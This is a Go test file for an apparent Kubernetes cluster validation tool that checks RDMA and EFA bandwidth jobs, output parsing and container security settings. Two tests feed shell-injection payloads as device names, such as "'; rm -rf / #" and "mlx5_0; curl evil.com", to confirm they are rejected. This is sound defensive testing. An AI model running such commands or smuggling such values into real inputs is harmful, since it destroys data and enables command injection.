package rdma

import (
	"math"
	"strings"
	"testing"

	"github.com/opendatahub-io/rhaii-cluster-validation/pkg/checks"
	"github.com/opendatahub-io/rhaii-cluster-validation/pkg/jobrunner"

	corev1 "k8s.io/api/core/v1"
)

func TestParseIBWriteBW(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		wantGbps float64
		wantErr  bool
	}{
		{
			name: "typical output",
			input: `
#bytes     #iterations    BW peak[MB/sec]    BW average[MB/sec]   MsgRate[Mpps]
 65536      5000           24985.12           24982.71             0.383
`,
			wantGbps: 24982.71 * 8 / 1000, // ~199.9 Gbps
		},
		{
			name: "multiple lines takes last",
			input: `
#bytes     #iterations    BW peak[MB/sec]    BW average[MB/sec]   MsgRate[Mpps]
 1024       1000           12000.00           11500.00             11.230
 65536      5000           24985.12           24982.71             0.383
`,
			wantGbps: 24982.71 * 8 / 1000,
		},
		{
			name: "low bandwidth",
			input: `
#bytes     #iterations    BW peak[MB/sec]    BW average[MB/sec]   MsgRate[Mpps]
 65536      5000           1250.00            1200.00              0.018
`,
			wantGbps: 1200.0 * 8 / 1000, // 9.6 Gbps
		},
		{
			name:    "empty output",
			input:   "",
			wantErr: true,
		},
		{
			name:    "headers only",
			input:   "#bytes     #iterations    BW peak[MB/sec]    BW average[MB/sec]   MsgRate[Mpps]\n",
			wantErr: true,
		},
		{
			name: "with separator lines",
			input: `
---------------------------------------------------------------------------------------
#bytes     #iterations    BW peak[MB/sec]    BW average[MB/sec]   MsgRate[Mpps]
---------------------------------------------------------------------------------------
 65536      5000           24985.12           24982.71             0.383
---------------------------------------------------------------------------------------
`,
			wantGbps: 24982.71 * 8 / 1000,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := parseIBWriteBW(tt.input)
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error, got nil")
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if math.Abs(got-tt.wantGbps) > 0.1 {
				t.Errorf("got %.1f Gbps, want %.1f Gbps", got, tt.wantGbps)
			}
		})
	}
}

func TestWEPClientScriptRejectsInvalidDeviceNames(t *testing.T) {
	tests := []struct {
		name    string
		devices []string
		reject  string
	}{
		{
			name:    "single-quote injection",
			devices: []string{"mlx5_0", "'; rm -rf / #", "mlx5_1"},
			reject:  "rm -rf",
		},
		{
			name:    "semicolon injection",
			devices: []string{"mlx5_0", "mlx5_0; curl evil.com"},
			reject:  "curl",
		},
		{
			name:    "backtick injection",
			devices: []string{"`whoami`"},
			reject:  "whoami",
		},
		{
			name:    "valid devices only",
			devices: []string{"mlx5_0", "mlx5_1", "ibp0"},
			reject:  "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			job := NewRDMAWEPJob(180, 100, tt.devices, []int{0, 1, 2})
			cmd := job.clientScript("10.0.0.1")
			script := strings.Join(cmd, " ")
			if tt.reject != "" && strings.Contains(script, tt.reject) {
				t.Errorf("script contains rejected payload %q:\n%s", tt.reject, script)
			}
		})
	}
}

func TestRDMABandwidthJobRejectsInvalidDevice(t *testing.T) {
	job := &RDMABandwidthJob{
		Duration: 10,
		Device:   "mlx5_0; rm -rf /",
		UseCUDA:  0,
	}
	args := job.buildArgs()
	for _, arg := range args {
		if strings.Contains(arg, "rm -rf") {
			t.Error("buildArgs contains injected payload")
		}
	}
}

func TestEFABandwidthJob(t *testing.T) {
	lanes := map[string][]EFABandwidthLane{
		"node-a": {
			{GPUID: 0, Device: "rdmap0"},
			{GPUID: 0, Device: "rdmap1"},
		},
		"node-b": {
			{GPUID: 0, Device: "rdmap4"},
			{GPUID: 0, Device: "rdmap5"},
		},
	}
	podCfg := map[string]*jobrunner.PodConfig{
		"node-a": {
			ResourceRequests: map[string]string{"nvidia.com/gpu": "8", "vpc.amazonaws.com/efa": "32"},
			ResourceLimits:   map[string]string{"nvidia.com/gpu": "8", "vpc.amazonaws.com/efa": "32"},
		},
		"node-b": {},
	}
	job := NewEFABandwidthJob(0, false, 350, 200, lanes, podCfg)

	server, err := job.ServerSpec("node-a", "rhaii-validation", "tools:latest")
	if err != nil {
		t.Fatalf("ServerSpec() error = %v", err)
	}
	job.MessageSize = 1024
	client, err := job.ClientSpec("node-b", "rhaii-validation", "tools:latest", "10.0.0.1")
	if err != nil {
		t.Fatalf("ClientSpec() error = %v", err)
	}

	serverScript := server.Spec.Template.Spec.Containers[0].Command[2]
	clientScript := client.Spec.Template.Spec.Containers[0].Command[2]
	for _, want := range []string{
		"FI_PROVIDER=efa",
		"FI_EFA_USE_DEVICE_RDMA=1",
		"FI_EFA_IFACE=\"rdmap0\"",
		"fi_rma_bw -m -p efa -o writedata -E=18515 -D cuda -i 0 -S 4194304",
		"FI_EFA_IFACE=\"rdmap1\"",
		"-E=18516",
	} {
		if !strings.Contains(serverScript, want) {
			t.Errorf("server command missing %q:\n%s", want, serverScript)
		}
	}
	if !strings.Contains(clientScript, "10.0.0.1") {
		t.Errorf("client command missing server IP:\n%s", clientScript)
	}
	if !strings.Contains(clientScript, "-S 1024") {
		t.Errorf("client command missing configured message size:\n%s", clientScript)
	}
	job.MessageSize = DefaultEFARMAMessageSize
	security := server.Spec.Template.Spec.Containers[0].SecurityContext
	if security == nil || security.Privileged != nil {
		t.Errorf("EFA job must be non-privileged, got %#v", security)
	}
	if security.Capabilities == nil || len(security.Capabilities.Add) != 1 || security.Capabilities.Add[0] != corev1.Capability("IPC_LOCK") {
		t.Errorf("EFA job capabilities = %#v, want IPC_LOCK", security.Capabilities)
	}

	result, err := job.ParseResult(`--- EFA LANE 0 DEVICE rdmap4 GPU 0 RC 0 ---
MB/sec: 20000
--- EFA LANE 1 DEVICE rdmap5 GPU 0 RC 0 ---
MB/sec: 25000
`)
	if err != nil {
		t.Fatalf("ParseResult() error = %v", err)
	}
	if result.Status != checks.StatusPass {
		t.Errorf("ParseResult() status = %s, want PASS: %s", result.Status, result.Message)
	}
	details := result.Details.(map[string]any)
	if details["aggregate_bandwidth_gbps"] != "360.0" {
		t.Errorf("aggregate bandwidth = %v, want 360.0", details["aggregate_bandwidth_gbps"])
	}

	failed, err := job.ParseResult(`--- EFA LANE 0 DEVICE rdmap4 GPU 0 RC 1 ---
provider error
--- EFA LANE 1 DEVICE rdmap5 GPU 0 RC 0 ---
MB/sec: 25000
`)
	if err != nil {
		t.Fatalf("ParseResult(failed lane) error = %v", err)
	}
	if failed.Status != checks.StatusFail {
		t.Errorf("ParseResult(failed lane) status = %s, want FAIL", failed.Status)
	}
}
